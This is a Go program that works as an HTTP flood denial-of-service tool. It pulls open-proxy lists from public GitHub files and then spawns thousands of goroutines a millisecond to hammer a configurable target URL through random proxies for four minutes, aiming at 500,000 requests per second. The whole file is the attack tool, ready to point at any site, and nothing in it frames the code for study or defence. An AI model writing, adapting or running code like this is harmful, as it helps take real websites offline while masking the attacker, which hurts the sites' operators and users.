package main
// wo
import (
	"bufio"
	"fmt"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// Configuration
const (
	targetURL          = "http://scam.vn" // Replace with your target
	durationSeconds    = 240
	requestsPerSecond  = 500000
	proxyFetchInterval = 5 * time.Minute
)

var (
	proxySources = []string{
		"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
		"https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
	}
	proxies      []string
	mu           sync.RWMutex
	requestsSent int64
)

func fetchProxies() {
	fmt.Println("Fetching proxies...")

	newProxies := make(map[string]bool)
	var wg sync.WaitGroup

	for _, sourceURL := range proxySources {
		wg.Add(1)
		go func(urlStr string) {
			defer wg.Done()
			resp, err := http.Get(urlStr)
			if err != nil {
				fmt.Printf("Error fetching proxies from %s: %v\n", urlStr, err)
				return
			}
			defer resp.Body.Close()

			if resp.StatusCode == http.StatusOK {
				scanner := bufio.NewScanner(resp.Body)
				for scanner.Scan() {
					proxy := strings.TrimSpace(scanner.Text())
					if isValidProxy(proxy) {
						newProxies[proxy] = true
					}
				}
				if err := scanner.Err(); err != nil {
					fmt.Printf("Error reading proxies from %s: %v\n", urlStr, err)
				}
			} else {
				fmt.Printf("Failed to fetch proxies from %s, status code: %d\n", urlStr, resp.StatusCode)
			}
		}(sourceURL)
	}
	wg.Wait()

	mu.Lock()
	proxies = make([]string, 0, len(newProxies))
	for p := range newProxies {
		proxies = append(proxies, p)
	}
	mu.Unlock()

	fmt.Printf("Fetched %d valid HTTP proxies.\n", len(proxies))
}

// Validate proxy format (ip:port)
func isValidProxy(proxy string) bool {
	if !strings.Contains(proxy, ":") {
		return false
	}
	parts := strings.Split(proxy, ":")
	if len(parts) != 2 {
		return false
	}
	return true
}

// Send request using a random proxy
func sendRequestWithProxy(urlStr string, wg *sync.WaitGroup) {
	defer wg.Done()

	mu.RLock()
	if len(proxies) == 0 {
		fmt.Println("No proxies available. Skipping request.")
		mu.RUnlock()
		return
	}
	randomProxy := proxies[rand.Intn(len(proxies))] // Random proxy selection
	mu.RUnlock()

	proxyURL, err := url.Parse("http://" + randomProxy)
	if err != nil {
		fmt.Printf("Invalid proxy format: %s, Error: %v\n", randomProxy, err)
		return
	}

	transport := &http.Transport{
		Proxy: http.ProxyURL(proxyURL),
	}

	client := &http.Client{
		Transport: transport,
		Timeout:   15 * time.Second, // Increased timeout
	}

	resp, err := client.Get(urlStr)
	if err != nil {
		fmt.Printf("Error sending request via proxy %s: %v\n", randomProxy, err)
		return
	}
	defer resp.Body.Close()

	fmt.Printf("Response [%d] from %s via proxy %s\n", resp.StatusCode, urlStr, randomProxy)
	atomic.AddInt64(&requestsSent, 1)
}

func main() {
	rand.Seed(time.Now().UnixNano())

	fetchProxies()

	go func() {
		ticker := time.NewTicker(proxyFetchInterval)
		defer ticker.Stop()
		for range ticker.C {
			fetchProxies()
		}
	}()

	startTime := time.Now()
	endTime := startTime.Add(time.Duration(durationSeconds) * time.Second)
	var wg sync.WaitGroup

	fmt.Printf("Sending up to %d requests to %s using random proxies...\n", requestsPerSecond*durationSeconds, targetURL)

	concurrency := 10000

	for time.Now().Before(endTime) {
		for i := 0; i < concurrency; i++ {
			wg.Add(1)
			go sendRequestWithProxy(targetURL, &wg)
		}
		time.Sleep(1 * time.Millisecond)
	}

	fmt.Println("Waiting for all requests to complete...")
	wg.Wait()

	elapsedTime := time.Since(startTime)
	actualRPS := float64(atomic.LoadInt64(&requestsSent)) / elapsedTime.Seconds()

	fmt.Printf("\nFinished sending requests in %s\n", elapsedTime)
	fmt.Printf("Total requests sent: %d\n", atomic.LoadInt64(&requestsSent))
	fmt.Printf("Achieved RPS: %.2f\n", actualRPS)
}
